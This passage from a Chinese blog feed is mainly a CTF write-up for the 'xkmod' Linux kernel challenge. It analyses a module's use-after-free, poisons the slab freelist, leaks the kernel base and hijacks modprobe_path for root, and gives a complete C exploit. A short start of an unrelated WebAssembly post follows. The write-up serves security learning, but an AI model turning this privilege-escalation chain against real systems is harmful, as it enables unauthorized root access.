microcode; SMT Host state unknown</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Vulnerable</span><br><span class="line">Mitigation: usercopy/swapgs barriers and __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpoline, STIBP: disabled, RSB filling</span><br><span class="line">Not affected</span><br></pre></td></tr></table></figure><p>这个题目给的cpio中并没有init脚本</p><p>不过可以发现 <code>xkmod.ko</code> ，按照惯例这应当就是有漏洞的 LKM，拖入 IDA 进行分析。</p><p>在模块载入时会新建一个 kmem_cache 叫 <code>&quot;lalala&quot;</code>，对应 object 大小是 192，这里我们注意到后面三个参数都是 0 ，对应的是 align(对齐),flags(标志位),ctor(构造函数)，由于没有设置 <code>SLAB_ACCOUNT</code> 标志位故该 <code>kmem_cache</code> <strong>会默认与 kmalloc-192 合并</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">xkmod_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  kmem_cache *v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_1E4);</span><br><span class="line">  misc_register(&amp;xkmod_device);</span><br><span class="line">  v0 = (kmem_cache *)kmem_cache_create(<span class="string">&quot;lalala&quot;</span>, <span class="number">192LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  s = v0;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他的主要就是实现了ioctl,以及在关闭文件时会释放object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">xkmod_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(&amp;v3, a3, <span class="number">16LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">107374182</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( buf &amp;&amp; v5 &lt;= <span class="number">0x50</span> &amp;&amp; v4 &lt;= <span class="number">0x70</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        copy_from_user((<span class="type">char</span> *)buf + (<span class="type">int</span>)v4, v3, (<span class="type">int</span>)v5);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 != <span class="number">125269879</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a2 == <span class="number">17895697</span> )</span><br><span class="line">          buf = (<span class="type">void</span> *)kmem_cache_alloc(s, <span class="number">3264LL</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( buf &amp;&amp; v5 &lt;= <span class="number">0x50</span> &amp;&amp; v4 &lt;= <span class="number">0x70</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        copy_to_user(v3, (<span class="type">char</span> *)buf + (<span class="type">int</span>)v4);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xkmod_ioctl_cold();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 buf 是一个全局指针，我们可以注意到 ioctl 中所有的操作<strong>都没有上锁</strong>。</p><p>漏洞点主要在关闭设备文件时会释放掉 buf，但是没有将 buf 指针置 NULL，<strong>只要我们同时打开多个设备文件便能完成 UAF</strong>。</p><p>需要的结构体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> *ptr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> length;</span><br><span class="line">&#125;data;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h3><p>首先因为uaf的存在,我们能够泄露一个object释放之后的内容</p><p>而kmem_cache的offset成员,决定了一个obj释放后的next指针位置</p><p>这里经过测试可以前八个字节就是一个内核地址,但是每次的页内偏移不同</p><p>由此可以知道</p><ol><li><code>offset==0</code></li><li>开启了RANDOM_FREELIST 保护</li><li>没有开启HARDENED_FREELIST保护</li></ol><p>freelist 随机化保护并非是一个运行时保护，而是在为 slub 分配页面时会将页面内的 object 指针随机打乱，<strong>但是在后面的分配释放中依然遵循着后进先出的原则</strong>，因此我们可以先获得一个 object 的 UAF，修改其 next 为我们想要分配的地址，之后我们连续进行两次分配<strong>便能够成功获得目标地址上的 object ，实现任意地址读写</strong>。</p><p>但这么做有着一个小问题，当我们分配到目标地址时<strong>目标地址前 8 字节的数据会被写入 freelist，而这通常并非一个有效的地址</strong>，从而导致 kernel panic，因此我们应当尽量选取目标地址往前的一个有着 8 字节 0 的区域，从而使得 freelist 获得一个 <strong>NULL 指针</strong>，促使 kmem_cache 向 buddy system 请求一个新的 slub，这样就不会发生 crash。</p><h3 id="泄露基址"><a href="#泄露基址" class="headerlink" title="泄露基址"></a>泄露基址</h3><p>接下来我们考虑如何泄露内核基址，虽然题目新建的 <code>kmem_cache</code> 会默认与 <code>kmalloc-192</code> 合并，但为了还原出题人原始意图，我们还是将其当作一个独立的 <code>kmem_cache</code> 来完成利用。</p><p>在内核 “堆基址”（<code>page_offset_base</code>） + <code>0x9d000</code> 处存放着 <code>secondary_startup_64(0xffffffff81000030)</code> 函数的地址，而我们可以从 free object 的 next 指针获得一个堆上地址，从而去猜测堆的基址，之后分配到一个 <code>堆基址 + 0x9d000</code> 处的 object 以泄露内核基址，这个地址前面刚好有一片为 NULL 的区域方便我们分配。</p><p>若是没有猜中，笔者认为直接重试即可，但这里需要注意的是我们不能够直接退出，而应当保留原进程的文件描述符打开，否则会在退出进程时触发 slub 的 double free 检测，不过经笔者测验大部分情况下都能够猜中堆基址。</p><h3 id="修改modprobe-path以root执行程序"><a href="#修改modprobe-path以root执行程序" class="headerlink" title="修改modprobe_path以root执行程序"></a>修改modprobe_path以root执行程序</h3><p>接下来我们考虑如何通过任意地址写完成利用，比较常规的做法是覆写内核中的一些全局的可写的函数表（例如 <code>n_tty_ops</code>）来劫持内核执行流，这里选择覆写 <code>modprobe_path</code> 从而以 root 执行程序。</p><p>当我们尝试去执行(execve)一个非法的文件(file magic not found,即文件格式头错误)，内核会经历如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">    sys_execve()</span><br><span class="line">        do_execve()</span><br><span class="line">            do_execveat_common()</span><br><span class="line">                bprm_execve()</span><br><span class="line">                    exec_binprm()</span><br><span class="line">                        search_binary_handler()</span><br><span class="line">                            __request_module() // wrapped as request_module</span><br><span class="line">                                call_modprobe()</span><br></pre></td></tr></table></figure><p>其中 <code>call_modprobe()</code> 定义于 <code>kernel/kmod.c</code>，我们主要关注这部分代码（以下来着内核源码 5.14）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">call_modprobe</span><span class="params">(<span class="type">char</span> *module_name, <span class="type">int</span> wait)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    argv[<span class="number">0</span>] = modprobe_path;<span class="comment">//argv[0]即运行程序名</span></span><br><span class="line">    argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">    argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">    argv[<span class="number">3</span>] = module_name;  <span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">    argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">                     <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!info)</span><br><span class="line">        <span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>在这里调用了函数 <code>call_usermodehelper_exec()</code> 将 <code>modprobe_path</code> 作为可执行文件路径以 root 权限将其执行，这个地址上默认存储的值为<code>/sbin/modprobe</code>。</p><p>我们不难想到的是：若是我们能够劫持 modprobe_path，将其改写为我们指定的恶意脚本的路径，随后我们再执行一个非法文件，<strong>内核将会以 root 权限执行我们的恶意脚本</strong>。</p><p>modprobe_path的地址可以由符号名直接搜索到</p><p>但是有些vmlinux似乎去除了这个符号</p><p>这个时候就可以通过搜索modprobe_path的初始符号值<code>/sbin/modprobe</code>寻找</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-27_230748.png" alt=""></p><p>例如本题最终底下那个就是modprobe的地址,最顶上那个对应直接映射区</p><p>又或者在<code>/proc/kallsyms</code>文件夹下找</p><p><code>grep modprobe_path /proc/kallsyms</code></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>流程就是利用uaf写一个obj的next指针</p><p>首先泄露page_offset_base进而再次泄露page_offset_base+0x9d000处的内核函数指针</p><p>从而得到内核映射基址</p><p>然后uaf写modprobe_path为创建的利用程序路径</p><p>最后打开一个非法文件触发利用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODPROBE_PATH 0xffffffff82444700</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> *ptr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROOT_SCRIPT_PATH  <span class="string">&quot;/home/getshell&quot;</span></span></span><br><span class="line"><span class="type">char</span> root_cmd[] = <span class="string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bindCore</span><span class="params">(<span class="type">int</span> core)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">allocBuf</span><span class="params">(<span class="type">int</span> dev_fd, <span class="keyword">struct</span> Data *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x1111111</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">editBuf</span><span class="params">(<span class="type">int</span> dev_fd, <span class="keyword">struct</span> Data *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x6666666</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">readBuf</span><span class="params">(<span class="type">int</span> dev_fd, <span class="keyword">struct</span> Data *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x7777777</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> dev_fd[<span class="number">5</span>], root_script_fd, flag_fd;</span><br><span class="line">    <span class="type">size_t</span> kernel_heap_leak, kernel_text_leak;</span><br><span class="line">    <span class="type">size_t</span> kernel_base, kernel_offset, page_offset_base;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">0x100</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> <span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fundamental works */</span></span><br><span class="line">    bindCore(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        dev_fd[i] = open(<span class="string">&quot;/dev/xkmod&quot;</span>, O_RDONLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create fake modprobe_path file */</span></span><br><span class="line">    root_script_fd = open(ROOT_SCRIPT_PATH, O_RDWR | O_CREAT);</span><br><span class="line">    write(root_script_fd, root_cmd, <span class="keyword">sizeof</span>(root_cmd));</span><br><span class="line">    close(root_script_fd);</span><br><span class="line">    system(<span class="string">&quot;chmod +x &quot;</span> ROOT_SCRIPT_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct UAF */</span></span><br><span class="line">    data.ptr = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    data.offset = <span class="number">0</span>;</span><br><span class="line">    data.length = <span class="number">0x50</span>;</span><br><span class="line">    <span class="built_in">memset</span>(data.ptr, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    allocBuf(dev_fd[<span class="number">0</span>], &amp;data);</span><br><span class="line">    editBuf(dev_fd[<span class="number">0</span>], &amp;data);</span><br><span class="line">    close(dev_fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* leak kernel heap addr and guess the page_offset_base */</span></span><br><span class="line">    readBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    kernel_heap_leak = data.ptr[<span class="number">0</span>];</span><br><span class="line">    page_offset_base = kernel_heap_leak &amp; <span class="number">0xfffffffff0000000</span>;<span class="comment">//直接映射区的后28位一般是0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel heap leak: 0x%lx\n&quot;</span>, kernel_heap_leak);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] GUESSING page_offset_base: 0x%lx\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to alloc fake chunk at (page_offset_base + 0x9d000 - 0x10) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] leaking kernel base...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    data.ptr[<span class="number">0</span>] = page_offset_base + <span class="number">0x9d000</span> - <span class="number">0x10</span>;</span><br><span class="line">    data.offset = <span class="number">0</span>;</span><br><span class="line">    data.length = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    editBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    allocBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    allocBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    data.length = <span class="number">0x40</span>;</span><br><span class="line">    readBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    <span class="keyword">if</span> ((data.ptr[<span class="number">2</span>] &amp; <span class="number">0xfff</span>) != <span class="number">0x30</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] invalid data leak: 0x%lx\n&quot;</span>, data.ptr[<span class="number">2</span>]);</span><br><span class="line">        errExit(<span class="string">&quot;\033[31m\033[1m[x] FAILED TO HIT page_offset_base! TRY AGAIN!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = data.ptr[<span class="number">2</span>] - <span class="number">0x30</span>;</span><br><span class="line">    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base:\033[0m 0x%lx\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel offset:\033[0m 0x%lx\n&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the modprobe_path, we&#x27;ll let it requesting new slub page for it */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking modprobe_path...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    allocBuf(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    close(dev_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    data.ptr[<span class="number">0</span>] = kernel_offset + MODPROBE_PATH - <span class="number">0x10</span>;</span><br><span class="line">    data.offset = <span class="number">0</span>;</span><br><span class="line">    data.length = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">    editBuf(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    allocBuf(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    allocBuf(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *) &amp;data.ptr[<span class="number">2</span>], ROOT_SCRIPT_PATH);</span><br><span class="line">    data.length = <span class="number">0x30</span>;</span><br><span class="line">    editBuf(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* trigger the fake modprobe_path */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring fake modprobe_path...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/home/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read flag */</span></span><br><span class="line">    <span class="built_in">memset</span>(flag, <span class="number">0</span>, <span class="keyword">sizeof</span>(flag));</span><br><span class="line"></span><br><span class="line">    flag_fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (flag_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to chmod flag!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read(flag_fd, flag, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got flag: \033[0m%s\n&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">几道内核堆例题用以巩固</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="kernel" scheme="https://ixout.github.io/tags/kernel/"/>
    
    <category term="heap" scheme="https://ixout.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>WASM初识</title>
    <link href="https://ixout.github.io/posts/1523/"/>
    <id>https://ixout.github.io/posts/1523/</id>
    <published>2023-12-29T11:19:12.000Z</published>
    <updated>2024-01-19T07:04:01.878Z</updated>
    
    <content type="html"><![CDATA[<h1 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h1><p>WASM即WebAssembly</p><p>其是Google开发的一款浏览器中使用的汇编语言.设计的初衷是使用c原生binary加速jiavascript的计算行为。wasm编译形成的binary类似一种<strong><u>基于栈的虚拟机</u></strong>，<strong>有自己的编译器和指令集。</strong></p><p>要谈webassembly的历史就得谈到 <code>javaScript</code> 了，众所周知， <code>javaScript</code> 是一门动态类型的语言，编写程序时无需考虑变量类型，而且还可以运行时改变类型。对于开发者，确实很方便，但对于运行它的引擎就很有问题了。看一下 <code>V8</code> 引擎从 <code>js</code> 源码到执行的一个过程。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/v2-8a34ae8c1a7a0f87e19b1384a025e354_720w.webp" alt="img"></p><p>由于 <code>js</code> 的动态类型，解释器在执行代码的时候会在类型判断上带来一定的性能消耗，降低执行速度。所以 <code>V8</code> 引擎采用了 <code>JIT</code>（即时编译技术） 技术，<u>监控一些经常执行的代码，将其编译成 <code>CPU</code> 直接执行的机器码</u>，提高执行速度。但由于 <code>js</code> 动态类型，在某些情况下还得反优化，回到字节码进行执行。</p><p>随着前端的不断发展，项目的大小和复杂度不断增大，对于某些场景，性能上可能已经无法满足，浏览器厂商们也一直在探索性能优化的方法。</p><h3 id="NaCl-PNaCl"><a href="#NaCl-PNaCl" class="headerlink" title="NaCl/PNaCl"></a>NaCl/PNaCl</h3><p><code>2011</code> 年 <code>Google</code> 在 <code>Chrome</code> 中使用了 <code>NaCl</code> 技术，可以使得 <code>C</code> 语言编写的程序运行到浏览器中，下边是维基百科的定义。</p><blockquote><p><strong>Google Native Client</strong>（缩写为<strong>NaCl</strong>），是一个由谷歌所发起的开放源代码计划，采用BSD许可证。它采用沙盒技术，让Intel x86、ARM或MIPS子集的机器代码直接在沙盒上运行。它能够从浏览器直接运行程序机器代码，独立于用户的操作系统之外，使Web应用程序可以用接近于机器代码运作的速度来运行，同时兼顾安全性。其功能类似于微软的 ActiveX，但是ActiveX只支持视窗系统。</p></blockquote><p>但一个完整的 <code>NaCl</code> 应用，在分发时需要提供支持多个架构平台（X86 / X64 / ARM 等）的模块文件，后来谷歌又推出了与底层架构无关的 <code>PNaCl</code> 